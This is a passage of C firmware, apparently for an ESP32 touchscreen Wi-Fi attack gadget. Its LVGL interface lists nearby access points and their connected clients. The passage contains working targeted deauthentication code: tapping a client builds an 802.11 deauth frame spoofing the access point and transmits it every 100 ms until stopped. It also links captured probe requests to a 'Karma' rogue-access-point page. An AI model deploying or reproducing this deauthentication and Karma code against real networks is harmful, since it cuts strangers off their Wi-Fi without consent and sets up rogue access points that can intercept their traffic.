        if (ap->client_count > 5) {
            char more_text[32];
            snprintf(more_text, sizeof(more_text), "+%d more clients", ap->client_count - 5);
            lv_obj_t *more_row = lv_list_add_text(sniffer_ap_list, more_text);
            lv_obj_set_style_bg_color(more_row, ui_bg_color(), 0);
            lv_obj_set_style_bg_opa(more_row, LV_OPA_COVER, 0);
            lv_obj_set_style_text_color(more_row, lv_color_make(120, 120, 120), 0);
            lv_obj_set_style_text_font(more_row, &lv_font_montserrat_12, 0);
            lv_obj_set_style_pad_left(more_row, 35, 0);
        }
    }
    
    // Restore scroll position after refresh
    lv_obj_scroll_to_y(sniffer_ap_list, scroll_y, LV_ANIM_OFF);
}

// Refresh the observation view (single AP with its clients)
static void sniffer_refresh_observe_view(void) {
    if (!sniffer_observe_client_list || !sniffer_observe_mode || sniffer_observe_ap_index < 0) return;
    
    int ap_count = 0;
    const sniffer_ap_t *aps = wifi_sniffer_get_aps(&ap_count);
    
    if (sniffer_observe_ap_index >= ap_count || aps == NULL) return;
    
    const sniffer_ap_t *ap = &aps[sniffer_observe_ap_index];
    
    // Save scroll position before refresh
    lv_coord_t scroll_y = lv_obj_get_scroll_y(sniffer_observe_client_list);

    // Clear and rebuild client list
    lv_obj_clean(sniffer_observe_client_list);
    
    if (ap->client_count == 0) {
        lv_obj_t *msg = lv_label_create(sniffer_observe_client_list);
        lv_label_set_text(msg, "No clients detected yet.\nWaiting for activity...");
        lv_obj_set_style_text_color(msg, ui_text_color(), 0);
        lv_obj_set_style_text_font(msg, &lv_font_montserrat_14, 0);
    } else {
        // Hint label at the top
        lv_obj_t *hint = lv_label_create(sniffer_observe_client_list);
        lv_label_set_text(hint, "Tap a client to deauthenticate:");
        lv_obj_set_style_text_color(hint, ui_muted_color(), 0);
        lv_obj_set_style_text_font(hint, &lv_font_montserrat_12, 0);
        lv_obj_set_style_pad_bottom(hint, 4, 0);
        
        for (int j = 0; j < ap->client_count && j < MAX_CLIENTS_PER_AP; j++) {
            const sniffer_client_t *client = &ap->clients[j];
            
            char client_text[96];
            snprintf(client_text, sizeof(client_text), LV_SYMBOL_CLOSE " %02X:%02X:%02X:%02X:%02X:%02X   %d dBm",
                     client->mac[0], client->mac[1], client->mac[2],
                     client->mac[3], client->mac[4], client->mac[5],
                     client->rssi);
            
            // Create clickable button for each client (bigger touch target)
            lv_obj_t *client_row = lv_list_add_btn(sniffer_observe_client_list, NULL, "");
            lv_obj_set_style_bg_color(client_row, ui_bg_color(), LV_STATE_DEFAULT);
            lv_obj_set_style_bg_color(client_row, lv_color_make(60, 30, 30), LV_STATE_PRESSED);
            lv_obj_set_style_bg_opa(client_row, LV_OPA_COVER, 0);
            lv_obj_set_style_min_height(client_row, 45, 0);  // Bigger touch target
            lv_obj_set_style_pad_all(client_row, 8, 0);
            
            lv_obj_t *client_label = lv_label_create(client_row);
            lv_label_set_text(client_label, client_text);
            lv_obj_set_style_text_color(client_label, COLOR_MATERIAL_GREEN, 0);
            lv_obj_set_style_text_font(client_label, &lv_font_montserrat_14, 0);
            lv_obj_align(client_label, LV_ALIGN_LEFT_MID, 0, 0);  // Left-align
            
            // Add click callback for targeted deauth
            int user_data = (sniffer_observe_ap_index << 8) | j;
            lv_obj_add_event_cb(client_row, sniffer_client_click_cb, LV_EVENT_CLICKED, (void*)(intptr_t)user_data);
        }
    }

    // Restore scroll position after refresh
    lv_obj_scroll_to_y(sniffer_observe_client_list, scroll_y, LV_ANIM_OFF);
}

// Handle AP click - enter observation mode
static void sniffer_ap_click_cb(lv_event_t *e) {
    int ap_index = (int)(intptr_t)lv_event_get_user_data(e);
    
    int ap_count = 0;
    const sniffer_ap_t *aps = wifi_sniffer_get_aps(&ap_count);
    
    if (ap_index < 0 || ap_index >= ap_count || aps == NULL) {
        return;
    }
    
    const sniffer_ap_t *ap = &aps[ap_index];
    
    // Pause channel hopping and set fixed channel
    wifi_sniffer_set_fixed_channel(ap->channel);
    
    ESP_LOGI(TAG, "Observing AP: %s on channel %d", ap->ssid[0] ? ap->ssid : "[Hidden]", ap->channel);
    
    // Create fullscreen observation view
    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
    reset_function_page_children();
    
    // Enter observation mode AFTER reset_function_page_children (which resets these values)
    sniffer_observe_mode = true;
    sniffer_observe_ap_index = ap_index;
    
    function_page = lv_obj_create(lv_scr_act());
    lv_obj_set_size(function_page, LCD_H_RES, LCD_V_RES);
    lv_obj_set_style_bg_color(function_page, ui_bg_color(), 0);
    lv_obj_set_style_border_width(function_page, 0, 0);
    lv_obj_set_style_radius(function_page, 0, 0);
    lv_obj_set_style_pad_all(function_page, 0, 0);
    lv_obj_clear_flag(function_page, LV_OBJ_FLAG_SCROLLABLE);
    
    // Title bar
    lv_obj_t *title_bar = lv_obj_create(function_page);
    lv_obj_set_size(title_bar, lv_pct(100), 35);
    lv_obj_align(title_bar, LV_ALIGN_TOP_MID, 0, 0);
    lv_obj_set_style_bg_color(title_bar, COLOR_MATERIAL_INDIGO, 0);
    lv_obj_set_style_border_width(title_bar, 0, 0);
    lv_obj_set_style_radius(title_bar, 0, 0);
    lv_obj_set_style_pad_all(title_bar, 5, 0);
    lv_obj_clear_flag(title_bar, LV_OBJ_FLAG_SCROLLABLE);
    
    // Title text
    char title_text[64];
    if (ap->ssid[0] != '\0') {
        snprintf(title_text, sizeof(title_text), "Observing: %.20s", ap->ssid);
    } else {
        snprintf(title_text, sizeof(title_text), "Observing: %02X:%02X:%02X...",
                 ap->bssid[0], ap->bssid[1], ap->bssid[2]);
    }
    lv_obj_t *title_label = lv_label_create(title_bar);
    lv_label_set_text(title_label, title_text);
    lv_obj_set_style_text_color(title_label, ui_text_color(), 0);
    lv_obj_set_style_text_font(title_label, &lv_font_montserrat_14, 0);
    lv_obj_align(title_label, LV_ALIGN_LEFT_MID, 5, 0);
    lv_obj_add_flag(title_label, LV_OBJ_FLAG_CLICKABLE);
    lv_obj_add_event_cb(title_label, screenshot_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    // Channel indicator
    char ch_text[16];
    snprintf(ch_text, sizeof(ch_text), "Ch: %d", ap->channel);
    lv_obj_t *ch_label = lv_label_create(title_bar);
    lv_label_set_text(ch_label, ch_text);
    lv_obj_set_style_text_color(ch_label, COLOR_MATERIAL_GREEN, 0);
    lv_obj_align(ch_label, LV_ALIGN_RIGHT_MID, -5, 0);
    lv_obj_add_flag(ch_label, LV_OBJ_FLAG_CLICKABLE);
    lv_obj_add_event_cb(ch_label, screenshot_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    // Client list (stored in static for refresh)
    sniffer_observe_client_list = lv_list_create(function_page);
    lv_obj_set_size(sniffer_observe_client_list, lv_pct(100), LCD_V_RES - 35 - 50);
    lv_obj_align(sniffer_observe_client_list, LV_ALIGN_TOP_MID, 0, 35);
    lv_obj_set_style_bg_color(sniffer_observe_client_list, ui_bg_color(), 0);
    lv_obj_set_style_bg_opa(sniffer_observe_client_list, LV_OPA_COVER, 0);
    lv_obj_set_style_border_width(sniffer_observe_client_list, 0, 0);
    lv_obj_set_style_pad_all(sniffer_observe_client_list, 8, 0);
    
    // Initial population of client list
    sniffer_refresh_observe_view();
    
    // Close button at bottom
    lv_obj_t *close_btn = lv_btn_create(function_page);
    lv_obj_set_size(close_btn, 120, 40);
    lv_obj_align(close_btn, LV_ALIGN_BOTTOM_MID, 0, -5);
    lv_obj_set_style_bg_color(close_btn, COLOR_MATERIAL_TEAL, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(close_btn, lv_color_lighten(COLOR_MATERIAL_TEAL, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(close_btn, 0, 0);
    lv_obj_set_style_radius(close_btn, 8, 0);
    lv_obj_t *close_lbl = lv_label_create(close_btn);
    lv_label_set_text(close_lbl, "Close");
    lv_obj_set_style_text_color(close_lbl, ui_text_color(), 0);
    lv_obj_center(close_lbl);
    lv_obj_add_event_cb(close_btn, sniffer_observe_close_cb, LV_EVENT_CLICKED, NULL);
}

// Handle close from observation mode
static void sniffer_observe_close_cb(lv_event_t *e) {
    (void)e;
    
    // Resume channel hopping
    wifi_sniffer_resume_channel_hop();
    
    sniffer_observe_mode = false;
    sniffer_observe_ap_index = -1;
    sniffer_observe_client_list = NULL;  // Will be deleted with function_page
    
    ESP_LOGI(TAG, "Exiting observation mode, resuming channel hop");
    
    // Return to main sniffer view
    sniffer_yes_btn_cb(NULL);
}

// Timer callback for continuous targeted deauth
static void targeted_deauth_timer_cb(lv_timer_t *timer) {
    (void)timer;
    if (!targeted_deauth_active) {
        return;
    }
    
    // Switch to target channel
    esp_wifi_set_channel(targeted_deauth_channel, WIFI_SECOND_CHAN_NONE);
    
    // Build and send deauth frame
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    // Destination = target station (not broadcast!)
    memcpy(&deauth_frame[4], targeted_deauth_station_mac, 6);
    // Source = AP BSSID
    memcpy(&deauth_frame[10], targeted_deauth_ap_bssid, 6);
    // BSSID = AP BSSID
    memcpy(&deauth_frame[16], targeted_deauth_ap_bssid, 6);
    
    // Log AP info and raw deauth frame
    {
        ESP_LOGI(TAG, "[T-DEAUTH] AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X | STA: %02X:%02X:%02X:%02X:%02X:%02X | CH: %d",
                 targeted_deauth_ap_bssid[0], targeted_deauth_ap_bssid[1], targeted_deauth_ap_bssid[2],
                 targeted_deauth_ap_bssid[3], targeted_deauth_ap_bssid[4], targeted_deauth_ap_bssid[5],
                 targeted_deauth_station_mac[0], targeted_deauth_station_mac[1], targeted_deauth_station_mac[2],
                 targeted_deauth_station_mac[3], targeted_deauth_station_mac[4], targeted_deauth_station_mac[5],
                 targeted_deauth_channel);

        char hexbuf[3 * sizeof(deauth_frame_default) + 1];
        char *p = hexbuf;
        for (size_t i = 0; i < sizeof(deauth_frame_default); i++) {
            int written = sprintf(p, "%02X", deauth_frame[i]);
            p += written;
            if (i + 1 < sizeof(deauth_frame_default)) *p++ = ' ';
        }
        *p = '\0';
        ESP_LOGI(TAG, "[T-DEAUTH] RAW: %s", hexbuf);
    }

    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame_default), false);
    targeted_deauth_count++;
    
    // Update status label
    if (targeted_deauth_status_label) {
        char status[64];
        snprintf(status, sizeof(status), "Sending deauth... (%lu)", (unsigned long)targeted_deauth_count);
        lv_label_set_text(targeted_deauth_status_label, status);
    } else {
        // add console logging:
        

    }
}

// Stop button callback for targeted deauth
static void targeted_deauth_stop_cb(lv_event_t *e) {
    (void)e;
    targeted_deauth_active = false;
    
    if (targeted_deauth_timer) {
        lv_timer_del(targeted_deauth_timer);
        targeted_deauth_timer = NULL;
    }
    
    targeted_deauth_status_label = NULL;
    
    ESP_LOGI(TAG, "Targeted deauth stopped after %lu frames", (unsigned long)targeted_deauth_count);
    
    // Return to sniffer observation view (same AP) instead of menu
    if (targeted_deauth_ap_index >= 0) {
        // Create synthetic event to re-enter observation mode
        lv_event_t synthetic_event;
        memset(&synthetic_event, 0, sizeof(synthetic_event));
        synthetic_event.user_data = (void*)(intptr_t)targeted_deauth_ap_index;
        sniffer_ap_click_cb(&synthetic_event);
    } else {
        // Fallback to menu if no valid AP index
        nav_to_menu_flag = true;
    }
}

// Show targeted deauth screen
static void show_targeted_deauth_screen(void) {
    create_function_page_base("Deauth Station");
    
    // Content area
    lv_obj_t *content = lv_obj_create(function_page);
    lv_obj_set_size(content, lv_pct(100), LCD_V_RES - 30 - 70);
    lv_obj_align(content, LV_ALIGN_TOP_MID, 0, 30);
    lv_obj_set_style_bg_opa(content, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(content, 0, 0);
    lv_obj_set_style_pad_all(content, 15, 0);
    lv_obj_set_style_pad_gap(content, 8, 0);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);
    lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLLABLE);
    
    // SSID label
    lv_obj_t *ssid_lbl = lv_label_create(content);
    char ssid_text[64];
    snprintf(ssid_text, sizeof(ssid_text), "SSID: %s", targeted_deauth_ssid[0] ? targeted_deauth_ssid : "[Hidden]");
    lv_label_set_text(ssid_lbl, ssid_text);
    lv_obj_set_style_text_color(ssid_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(ssid_lbl, &lv_font_montserrat_14, 0);
    
    // BSSID label
    lv_obj_t *bssid_lbl = lv_label_create(content);
    char bssid_text[64];
    snprintf(bssid_text, sizeof(bssid_text), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
             targeted_deauth_ap_bssid[0], targeted_deauth_ap_bssid[1], targeted_deauth_ap_bssid[2],
             targeted_deauth_ap_bssid[3], targeted_deauth_ap_bssid[4], targeted_deauth_ap_bssid[5]);
    lv_label_set_text(bssid_lbl, bssid_text);
    lv_obj_set_style_text_color(bssid_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(bssid_lbl, &lv_font_montserrat_14, 0);
    
    // Station MAC label
    lv_obj_t *station_lbl = lv_label_create(content);
    char station_text[64];
    snprintf(station_text, sizeof(station_text), "Station: %02X:%02X:%02X:%02X:%02X:%02X",
             targeted_deauth_station_mac[0], targeted_deauth_station_mac[1], targeted_deauth_station_mac[2],
             targeted_deauth_station_mac[3], targeted_deauth_station_mac[4], targeted_deauth_station_mac[5]);
    lv_label_set_text(station_lbl, station_text);
    lv_obj_set_style_text_color(station_lbl, lv_color_make(0, 200, 0), 0);
    lv_obj_set_style_text_font(station_lbl, &lv_font_montserrat_14, 0);
    
    // Channel label
    lv_obj_t *channel_lbl = lv_label_create(content);
    char channel_text[32];
    snprintf(channel_text, sizeof(channel_text), "Channel: %d", targeted_deauth_channel);
    lv_label_set_text(channel_lbl, channel_text);
    lv_obj_set_style_text_color(channel_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(channel_lbl, &lv_font_montserrat_14, 0);
    
    // Status label (will be updated by timer)
    targeted_deauth_status_label = lv_label_create(content);
    lv_label_set_text(targeted_deauth_status_label, "Sending deauth... (0)");
    lv_obj_set_style_text_color(targeted_deauth_status_label, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_text_font(targeted_deauth_status_label, &lv_font_montserrat_16, 0);
    
    // STOP button at bottom
    lv_obj_t *stop_btn = lv_btn_create(function_page);
    lv_obj_set_size(stop_btn, 200, 55);
    lv_obj_align(stop_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(stop_btn, 0, 0);
    lv_obj_set_style_radius(stop_btn, 8, 0);
    lv_obj_set_style_shadow_width(stop_btn, 8, 0);
    lv_obj_set_style_shadow_color(stop_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(stop_btn, LV_OPA_30, 0);
    
    lv_obj_t *stop_lbl = lv_label_create(stop_btn);
    lv_label_set_text(stop_lbl, "STOP");
    lv_obj_set_style_text_color(stop_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(stop_lbl, &lv_font_montserrat_20, 0);
    lv_obj_center(stop_lbl);
    
    lv_obj_add_event_cb(stop_btn, targeted_deauth_stop_cb, LV_EVENT_CLICKED, NULL);
    
    // Start the deauth timer
    targeted_deauth_active = true;
    targeted_deauth_count = 0;
    targeted_deauth_timer = lv_timer_create(targeted_deauth_timer_cb, 100, NULL);  // Every 100ms
    
    ESP_LOGI(TAG, "Started targeted deauth: Station=%02X:%02X:%02X:%02X:%02X:%02X, AP=%s, Ch=%d",
             targeted_deauth_station_mac[0], targeted_deauth_station_mac[1], targeted_deauth_station_mac[2],
             targeted_deauth_station_mac[3], targeted_deauth_station_mac[4], targeted_deauth_station_mac[5],
             targeted_deauth_ssid, targeted_deauth_channel);
}

// Handle client click - start targeted deauth
static void sniffer_client_click_cb(lv_event_t *e) {
    int user_data = (int)(intptr_t)lv_event_get_user_data(e);
    int ap_index = (user_data >> 8) & 0xFF;
    int client_index = user_data & 0xFF;
    
    int ap_count = 0;
    const sniffer_ap_t *aps = wifi_sniffer_get_aps(&ap_count);
    
    if (ap_index < 0 || ap_index >= ap_count || aps == NULL) {
        ESP_LOGW(TAG, "Invalid AP index: %d", ap_index);
        return;
    }
    
    const sniffer_ap_t *ap = &aps[ap_index];
    
    if (client_index < 0 || client_index >= ap->client_count) {
        ESP_LOGW(TAG, "Invalid client index: %d", client_index);
        return;
    }
    
    const sniffer_client_t *client = &ap->clients[client_index];
    
    // Store target data
    memcpy(targeted_deauth_station_mac, client->mac, 6);
    memcpy(targeted_deauth_ap_bssid, ap->bssid, 6);
    strncpy(targeted_deauth_ssid, ap->ssid, sizeof(targeted_deauth_ssid) - 1);
    targeted_deauth_ssid[sizeof(targeted_deauth_ssid) - 1] = '\0';
    targeted_deauth_channel = ap->channel;
    targeted_deauth_ap_index = ap_index;  // Save AP index for returning after stop
    
    ESP_LOGI(TAG, "Client clicked: %02X:%02X:%02X:%02X:%02X:%02X on AP %s",
             client->mac[0], client->mac[1], client->mac[2],
             client->mac[3], client->mac[4], client->mac[5],
             ap->ssid[0] ? ap->ssid : "[Hidden]");
    
    // Show targeted deauth screen
    show_targeted_deauth_screen();
}

// Close popup overlay callback
static void close_popup_overlay_cb(lv_event_t *e)
{
    lv_obj_t *btn = lv_event_get_target(e);
    lv_obj_t *overlay = lv_obj_get_parent(lv_obj_get_parent(btn));
    lv_obj_del(overlay);
}

// Karma button callback from Network Observer - check for probes first
static void sniffer_karma_btn_cb(lv_event_t *e)
{
    (void)e;
    
    int probe_count = 0;
    const probe_request_t *probes = wifi_sniffer_get_probes(&probe_count);
    
    // Count non-empty SSIDs
    int valid_probes = 0;
    if (probes) {
        for (int i = 0; i < probe_count; i++) {
            if (probes[i].ssid[0] != '\0') {
                valid_probes++;
            }
        }
    }
    
    if (valid_probes > 0) {
        // Stop sniffer before going to Karma
        if (sniffer_task_active || sniffer_task_handle != NULL) {
            ESP_LOGI(TAG, "Stopping sniffer before Karma...");
            sniffer_task_active = false;
            for (int i = 0; i < 70 && sniffer_task_handle != NULL; i++) {
                vTaskDelay(pdMS_TO_TICKS(100));
            }
            if (sniffer_task_handle == NULL && sniffer_task_stack != NULL) {
                heap_caps_free(sniffer_task_stack);
                sniffer_task_stack = NULL;
            }
        }
        wifi_sniffer_stop();
        sniffer_disable_log_capture();
        sniffer_ui_active = false;
        
        show_karma_page();
    } else {
        // Show popup - no probes available
        lv_obj_t *overlay = lv_obj_create(lv_scr_act());
        lv_obj_set_size(overlay, LCD_H_RES, LCD_V_RES);
        lv_obj_set_pos(overlay, 0, 0);
        lv_obj_set_style_bg_color(overlay, ui_bg_color(), 0);
        lv_obj_set_style_bg_opa(overlay, LV_OPA_70, 0);
        lv_obj_set_style_border_width(overlay, 0, 0);
        lv_obj_clear_flag(overlay, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_add_flag(overlay, LV_OBJ_FLAG_CLICKABLE);
        
        lv_obj_t *dialog = lv_obj_create(overlay);
        lv_obj_set_size(dialog, 280, 120);
        lv_obj_center(dialog);
        lv_obj_set_style_bg_color(dialog, ui_panel_color(), 0);
        lv_obj_set_style_border_color(dialog, COLOR_MATERIAL_PINK, 0);
        lv_obj_set_style_border_width(dialog, 2, 0);
        lv_obj_set_style_radius(dialog, 10, 0);
        lv_obj_clear_flag(dialog, LV_OBJ_FLAG_SCROLLABLE);
        
        lv_obj_t *msg = lv_label_create(dialog);
        lv_label_set_text(msg, "No probe requests captured yet.\nKeep scanning to collect probes.");
        lv_obj_set_style_text_color(msg, ui_text_color(), 0);
        lv_obj_set_style_text_font(msg, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_align(msg, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_align(msg, LV_ALIGN_TOP_MID, 0, 10);
        
        lv_obj_t *ok_btn = lv_btn_create(dialog);
        lv_obj_set_size(ok_btn, 80, 30);
        lv_obj_align(ok_btn, LV_ALIGN_BOTTOM_MID, 0, -5);
        lv_obj_set_style_bg_color(ok_btn, COLOR_MATERIAL_PINK, LV_STATE_DEFAULT);
        lv_obj_set_style_border_width(ok_btn, 0, 0);
        lv_obj_set_style_radius(ok_btn, 8, 0);
        lv_obj_t *ok_lbl = lv_label_create(ok_btn);
        lv_label_set_text(ok_lbl, "OK");
        lv_obj_set_style_text_color(ok_lbl, ui_text_color(), 0);
        lv_obj_center(ok_lbl);
        // Close overlay on OK click
        lv_obj_add_event_cb(ok_btn, close_popup_overlay_cb, LV_EVENT_CLICKED, NULL);
    }
}

static void sniffer_yes_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // Recreate base page with channel indicator
    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
    reset_function_page_children();
    
    // Hide main screen tiles and title bar (needed when called directly from main menu)
    if (tiles_container) {
        lv_obj_add_flag(tiles_container, LV_OBJ_FLAG_HIDDEN);
    }
    if (title_bar) {
        lv_obj_add_flag(title_bar, LV_OBJ_FLAG_HIDDEN);
    }
    
    function_page = lv_obj_create(lv_scr_act());
    lv_obj_set_size(function_page, LCD_H_RES, LCD_V_RES);
    lv_obj_set_style_bg_color(function_page, ui_bg_color(), 0);
    lv_obj_set_style_border_width(function_page, 0, 0);
    lv_obj_set_style_radius(function_page, 0, 0);
    lv_obj_set_style_pad_all(function_page, 0, 0);
    lv_obj_clear_flag(function_page, LV_OBJ_FLAG_SCROLLABLE);
    
    // Title bar with channel indicator
    lv_obj_t *title_bar = lv_obj_create(function_page);
    lv_obj_set_size(title_bar, lv_pct(100), 30);
    lv_obj_align(title_bar, LV_ALIGN_TOP_MID, 0, 0);
    lv_obj_set_style_bg_color(title_bar, ui_panel_color(), 0);
    lv_obj_set_style_border_width(title_bar, 0, 0);
    lv_obj_set_style_radius(title_bar, 0, 0);
    lv_obj_set_style_pad_all(title_bar, 0, 0);
    lv_obj_clear_flag(title_bar, LV_OBJ_FLAG_SCROLLABLE);
    
    lv_obj_t *title_label = lv_label_create(title_bar);
    lv_label_set_text(title_label, "Network Observer");
    lv_obj_set_style_text_color(title_label, ui_text_color(), 0);
    lv_obj_align(title_label, LV_ALIGN_LEFT_MID, 10, 0);
    lv_obj_add_flag(title_label, LV_OBJ_FLAG_CLICKABLE);
    lv_obj_add_event_cb(title_label, screenshot_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    // Channel indicator (shifted left to make room for voltage)
    sniffer_channel_label = lv_label_create(title_bar);
    lv_label_set_text(sniffer_channel_label, "Ch: --");
    lv_obj_set_style_text_color(sniffer_channel_label, COLOR_MATERIAL_GREEN, 0);
    lv_obj_align(sniffer_channel_label, LV_ALIGN_RIGHT_MID, -70, 0);
    lv_obj_add_flag(sniffer_channel_label, LV_OBJ_FLAG_CLICKABLE);
    lv_obj_add_event_cb(sniffer_channel_label, screenshot_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    // Battery voltage label - far right of title bar
    battery_label = lv_label_create(title_bar);
    lv_label_set_text(battery_label, last_voltage_str);
    lv_obj_set_style_text_color(battery_label, ui_muted_color(), 0);
    lv_obj_set_style_text_font(battery_label, &lv_font_montserrat_12, 0);
    lv_obj_align(battery_label, LV_ALIGN_RIGHT_MID, -8, 0);
    if (last_voltage_str[0] == '\0') lv_obj_add_flag(battery_label, LV_OBJ_FLAG_HIDDEN);

    // Set sniffer UI active flag
    sniffer_ui_active = true;
    sniffer_observe_mode = false;
    sniffer_observe_ap_index = -1;
    scan_done_ui_flag = false;
    sniffer_log_ta = NULL;
    
    // Scrollable list for networks with clients
    sniffer_ap_list = lv_list_create(function_page);
    lv_obj_set_size(sniffer_ap_list, lv_pct(100), LCD_V_RES - 30 - 50);  // Leave space for title and buttons
    lv_obj_align(sniffer_ap_list, LV_ALIGN_TOP_MID, 0, 30);
    lv_obj_set_style_bg_color(sniffer_ap_list, ui_bg_color(), 0);
    lv_obj_set_style_bg_opa(sniffer_ap_list, LV_OPA_COVER, 0);
    lv_obj_set_style_border_width(sniffer_ap_list, 0, 0);
    lv_obj_set_style_pad_all(sniffer_ap_list, 4, 0);
    
    // Immediately show networks (no "Starting sniffer..." message)
    sniffer_refresh_ap_list();
    
    // Bottom control row
    lv_obj_t *control_row = lv_obj_create(function_page);
    lv_obj_set_size(control_row, lv_pct(100), 50);
    lv_obj_align(control_row, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(control_row, lv_color_make(20, 20, 20), 0);
    lv_obj_set_style_border_width(control_row, 0, 0);
    lv_obj_set_style_pad_all(control_row, 5, 0);
    lv_obj_set_flex_flow(control_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(control_row, LV_FLEX_ALIGN_SPACE_EVENLY, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(control_row, LV_OBJ_FLAG_SCROLLABLE);
    
    // Start/Stop button (green when inactive, red when active)
    sniffer_start_btn = lv_btn_create(control_row);
    lv_obj_set_size(sniffer_start_btn, 80, 35);
    lv_obj_set_style_border_width(sniffer_start_btn, 0, 0);
    lv_obj_set_style_radius(sniffer_start_btn, 8, 0);
    lv_obj_t *start_lbl = lv_label_create(sniffer_start_btn);
    lv_obj_set_style_text_color(start_lbl, ui_text_color(), 0);
    lv_obj_center(start_lbl);
    lv_obj_add_event_cb(sniffer_start_btn, sniffer_start_btn_cb, LV_EVENT_CLICKED, NULL);

    // Set initial state based on whether sniffer is already active
    if (sniffer_task_active) {
        lv_label_set_text(start_lbl, "Stop");
        lv_obj_set_style_bg_color(sniffer_start_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(sniffer_start_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
    } else {
        lv_label_set_text(start_lbl, "Start");
        lv_obj_set_style_bg_color(sniffer_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(sniffer_start_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
    }
    
    // Rescan button (orange) - clears data and rescans
    lv_obj_t *rescan_btn = lv_btn_create(control_row);
    lv_obj_set_size(rescan_btn, 80, 35);
    lv_obj_set_style_bg_color(rescan_btn, COLOR_MATERIAL_ORANGE, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(rescan_btn, lv_color_lighten(COLOR_MATERIAL_ORANGE, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(rescan_btn, 0, 0);
    lv_obj_set_style_radius(rescan_btn, 8, 0);
    lv_obj_t *rescan_lbl = lv_label_create(rescan_btn);
    lv_label_set_text(rescan_lbl, "Rescan");
    lv_obj_set_style_text_color(rescan_lbl, ui_text_color(), 0);
    lv_obj_center(rescan_lbl);
    lv_obj_add_event_cb(rescan_btn, sniffer_rescan_cb, LV_EVENT_CLICKED, NULL);
    
    // Karma button (pink) - go to Karma if probes available
    lv_obj_t *karma_btn = lv_btn_create(control_row);
    lv_obj_set_size(karma_btn, 80, 35);
    lv_obj_set_style_bg_color(karma_btn, COLOR_MATERIAL_PINK, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(karma_btn, lv_color_lighten(COLOR_MATERIAL_PINK, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(karma_btn, 0, 0);
    lv_obj_set_style_radius(karma_btn, 8, 0);
    lv_obj_t *karma_lbl = lv_label_create(karma_btn);
    lv_label_set_text(karma_lbl, "Karma");
    lv_obj_set_style_text_color(karma_lbl, ui_text_color(), 0);
    lv_obj_center(karma_lbl);
    lv_obj_add_event_cb(karma_btn, sniffer_karma_btn_cb, LV_EVENT_CLICKED, NULL);
    
    // Quit button (teal)
    lv_obj_t *quit_btn = lv_btn_create(control_row);
    lv_obj_set_size(quit_btn, 80, 35);
    lv_obj_set_style_bg_color(quit_btn, COLOR_MATERIAL_TEAL, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(quit_btn, lv_color_lighten(COLOR_MATERIAL_TEAL, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(quit_btn, 0, 0);
    lv_obj_set_style_radius(quit_btn, 8, 0);
    lv_obj_t *quit_lbl = lv_label_create(quit_btn);
    lv_label_set_text(quit_lbl, "Quit");
    lv_obj_set_style_text_color(quit_lbl, ui_text_color(), 0);
    lv_obj_center(quit_lbl);
    lv_obj_add_event_cb(quit_btn, sniffer_quit_cb, LV_EVENT_CLICKED, NULL);
    
    // Enable log capture
    sniffer_enable_log_capture();
    
    // Set new client callback for UI refresh
    wifi_sniffer_set_new_client_callback(sniffer_new_client_notify);
    
    // Auto-start sniffer task
    if (!sniffer_task_active) {
        ESP_LOGI(TAG, "Starting WiFi Sniffer...");
        sniffer_task_active = true;
        sniffer_start_time = (uint32_t)(esp_timer_get_time() / 1000);  // Record start time for delayed sorting
        
        sniffer_task_stack = (StackType_t *)heap_caps_malloc(8192 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
        if (sniffer_task_stack != NULL) {
            sniffer_task_handle = xTaskCreateStatic(sniffer_task, "sniffer", 8192, NULL, 
                5, sniffer_task_stack, &sniffer_task_buffer);
            if (sniffer_task_handle == NULL) {
                ESP_LOGE(TAG, "Failed to create sniffer task");
                heap_caps_free(sniffer_task_stack);
                sniffer_task_stack = NULL;
                sniffer_task_active = false;
            } else {
                ESP_LOGI(TAG, "Sniffer task created with PSRAM stack");
                update_sniffer_button_ui();
            }
